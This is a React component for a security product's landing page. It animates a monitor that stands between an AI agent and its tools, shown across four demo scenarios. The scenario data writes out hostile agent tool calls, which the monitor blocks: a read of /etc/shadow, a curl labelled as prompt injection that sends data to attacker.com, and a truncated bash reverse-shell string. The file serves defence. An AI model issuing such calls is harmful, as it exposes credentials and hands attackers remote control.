'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';

type Mode = 'path-traversal' | 'prompt-injection' | 'shell-injection' | 'benign-allow';

export function SignatureArchitectureHUD() {
  const [mode, setMode] = useState<Mode>('path-traversal');
  const [pulse, setPulse] = useState(false);

  useEffect(() => {
    setPulse(true);
    const t = setTimeout(() => setPulse(false), 800);
    return () => clearTimeout(t);
  }, [mode]);

  const scenarios = {
    'path-traversal': {
      title: 'Path Traversal Escape',
      tool: 'filesystem.read',
      param: 'path: "/etc/shadow"',
      verdict: 'BLOCK',
      rule: 'sandbox.filesystem.path_confinement',
      bytes: 0,
      latency: '1.8 µs',
      color: 'rose',
    },
    'prompt-injection': {
      title: 'Indirect Prompt Injection',
      tool: 'network.curl',
      param: 'url: "https://attacker.com/leak"',
      verdict: 'BLOCK',
      rule: 'difc.taint.untrusted_egress_sink',
      bytes: 0,
      latency: '2.4 µs',
      color: 'rose',
    },
    'shell-injection': {
      title: 'Command / Reverse Shell',
      tool: 'terminal.exec',
      param: 'cmd: "bash -i >& /dev/tcp/..."',
      verdict: 'BLOCK',
      rule: 'containment.prohibit_reverse_shell',
      bytes: 0,
      latency: '2.1 µs',
      color: 'rose',
    },
    'benign-allow': {
      title: 'Authorized In-Scope Call',
      tool: 'filesystem.read',
      param: 'path: "src/index.ts"',
      verdict: 'ALLOW',
      rule: 'policy.workspace.read_permitted',
      bytes: 384,
      latency: '1.9 µs',
      color: 'emerald',
    },
  };

  const current = scenarios[mode];

  return (
    <div className="card lp-sig-hud">
      <div className="lp-sig-hud-header">
        <div className="flex items-center gap-2">
          <span className="demo-live-dot" />
          <span className="text-xs font-mono uppercase tracking-wider text-slate-300 font-bold">
            Execution Reference Monitor HUD
          </span>
        </div>
        <div className="flex gap-1.5">
          <button
            type="button"
            className={`lp-hud-chip ${mode === 'path-traversal' ? 'active' : ''}`}
            onClick={() => setMode('path-traversal')}
          >
            Path Traversal
          </button>
          <button
            type="button"
            className={`lp-hud-chip ${mode === 'prompt-injection' ? 'active' : ''}`}
            onClick={() => setMode('prompt-injection')}
          >
            Taint Injection
          </button>
          <button
            type="button"
            className={`lp-hud-chip ${mode === 'shell-injection' ? 'active' : ''}`}
            onClick={() => setMode('shell-injection')}
          >
            Shell Attack
          </button>
          <button
            type="button"
            className={`lp-hud-chip ${mode === 'benign-allow' ? 'active' : ''}`}
            onClick={() => setMode('benign-allow')}
          >
            Benign Call
          </button>
        </div>
      </div>

      {/* 3-Stage Diagram: Cognition -> Mastyf -> Execution */}
      <div className="lp-sig-stage-grid">
        {/* Box 1: Cognition */}
        <div className="lp-sig-node lp-sig-cognition">
          <div className="lp-sig-node-tag text-[10px] text-slate-400 font-mono uppercase">
            1. Untrusted Cognition
          </div>
          <div className="text-xs font-bold text-white mt-1">AI Agent / LLM</div>
          <div className="lp-sig-code-snippet">
            <div className="text-cyan-400 font-mono text-[11px]">{current.tool}</div>
            <div className="text-slate-400 font-mono text-[10px] truncate">{current.param}</div>
          </div>
          <span className="text-[10px] text-slate-500 mt-2 block">
            Agent proposes action. Model has zero native authority.
          </span>
        </div>

        {/* Connector 1 (Cognition -> Mastyf Perimeter) */}
        <div className="lp-sig-wire">
          <svg className="lp-beam-svg" width="60" height="24" viewBox="0 0 60 24" aria-hidden="true">
            <defs>
              <linearGradient id="beam-grad-1" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" stopColor="#38bdf8" stopOpacity="0.2" />
                <stop offset="50%" stopColor="#38bdf8" stopOpacity="1" />
                <stop offset="100%" stopColor="#fbbf24" stopOpacity="0.8" />
              </linearGradient>
            </defs>
            <line x1="0" y1="12" x2="60" y2="12" stroke="rgba(255,255,255,0.15)" strokeWidth="2" strokeDasharray="3 3" />
            <line
              x1="0"
              y1="12"
              x2="60"
              y2="12"
              stroke="url(#beam-grad-1)"
              strokeWidth="2.5"
              strokeDasharray="20 40"
              className="lp-animated-beam-line"
            />
          </svg>
          <span className="text-[9px] font-mono text-slate-500 uppercase mt-1">Wire 1</span>
        </div>

        {/* Box 2: MASTYF SECURITY PERIMETER */}
        <div className="lp-sig-node lp-sig-perimeter relative overflow-hidden">
          <div className="lp-border-beam" />
          <div className="lp-sig-perimeter-header">
            <span className="text-amber-400 font-extrabold text-xs">🛡️ MASTYF PERIMETER</span>
            <span className="text-[9px] font-mono text-slate-400">&lt;4.8µs CBAC</span>
          </div>

          <div className="lp-sig-gate-row">
            <div className="lp-sig-mini-gate">
              <span className="text-[10px] text-slate-400">Authorize</span>
              <strong className="text-white text-[11px]">CBAC Invariant</strong>
            </div>
            <div className="lp-sig-mini-gate">
              <span className="text-[10px] text-slate-400">Validate</span>
              <strong className="text-white text-[11px]">Schema Bounds</strong>
            </div>
          </div>

          <div className="lp-sig-gate-row">
            <div className="lp-sig-mini-gate">
              <span className="text-[10px] text-slate-400">Inspect</span>
              <strong className="text-white text-[11px]">DIFC Taint Flow</strong>
            </div>
            <div className="lp-sig-mini-gate">
              <span className="text-[10px] text-slate-400">Enforce</span>
              <strong className="text-white text-[11px]">Fail-Closed Gate</strong>
            </div>
          </div>

          <div className="lp-sig-verdict-bar">
            <span className="text-[10px] font-mono text-slate-400">Decision:</span>
            <span
              className={`font-mono text-xs font-bold px-2 py-0.5 rounded ${
                current.verdict === 'BLOCK'
                  ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                  : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
              }`}
            >
              {current.verdict}
            </span>
            <span className="text-[10px] font-mono text-slate-400 ml-auto">{current.latency}</span>
          </div>
        </div>

        {/* Connector 2 (Mastyf -> Privileged Tools) */}
        <div className="lp-sig-wire">
          {current.verdict === 'BLOCK' ? (
            <div className="lp-sig-severed">
              <span className="text-rose-400 font-bold text-xs">✕ SEVERED</span>
              <span className="text-[9px] font-mono text-rose-300">0 BYTES</span>
            </div>
          ) : (
            <div className="lp-sig-allowed">
              <svg className="lp-beam-svg" width="60" height="24" viewBox="0 0 60 24" aria-hidden="true">
                <defs>
                  <linearGradient id="beam-grad-allow" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" stopColor="#10b981" stopOpacity="0.4" />
                    <stop offset="100%" stopColor="#34d399" stopOpacity="1" />
                  </linearGradient>
                </defs>
                <line x1="0" y1="12" x2="60" y2="12" stroke="rgba(16,185,129,0.2)" strokeWidth="2" strokeDasharray="3 3" />
                <line
                  x1="0"
                  y1="12"
                  x2="60"
                  y2="12"
                  stroke="url(#beam-grad-allow)"
                  strokeWidth="2.5"
                  strokeDasharray="20 40"
                  className="lp-animated-beam-line"
                />
              </svg>
              <span className="text-[9px] font-mono text-emerald-400 font-semibold">{current.bytes} BYTES</span>
            </div>
          )}
        </div>

        {/* Box 3: Downstream Tools */}
        <div
          className={`lp-sig-node lp-sig-tools ${
            current.verdict === 'BLOCK' ? 'lp-node-blocked' : 'lp-node-allowed'
          }`}
        >
          <div className="lp-sig-node-tag text-[10px] text-slate-400 font-mono uppercase">
            3. Privileged Tools
          </div>
          <div className="text-xs font-bold text-white mt-1">MCP / OS / Database</div>
          <div className="mt-2 text-[11px] text-slate-300 leading-tight">
            {current.verdict === 'BLOCK' ? (
              <span className="text-slate-400">
                🛑 <strong className="text-rose-400">Zero backend bytes.</strong> Subprocess never forked; database socket never opened.
              </span>
            ) : (
              <span className="text-slate-400">
                ⚡ <strong className="text-emerald-400">Authorized execution.</strong> Dispatched to tool server with cryptographic receipt.
              </span>
            )}
          </div>
        </div>
      </div>

      {/* Footer Info */}
      <div className="lp-sig-hud-footer">
        <div className="text-[11px] font-mono text-slate-400 truncate">
          <span className="text-slate-500">Active Rule:</span> {current.rule}
        </div>
        <Link href="#shield" className="text-[11px] font-semibold text-amber-400 hover:underline shrink-0">
          Explore Mastyf Shield Visualizer ↓
        </Link>
      </div>
    </div>
  );
}
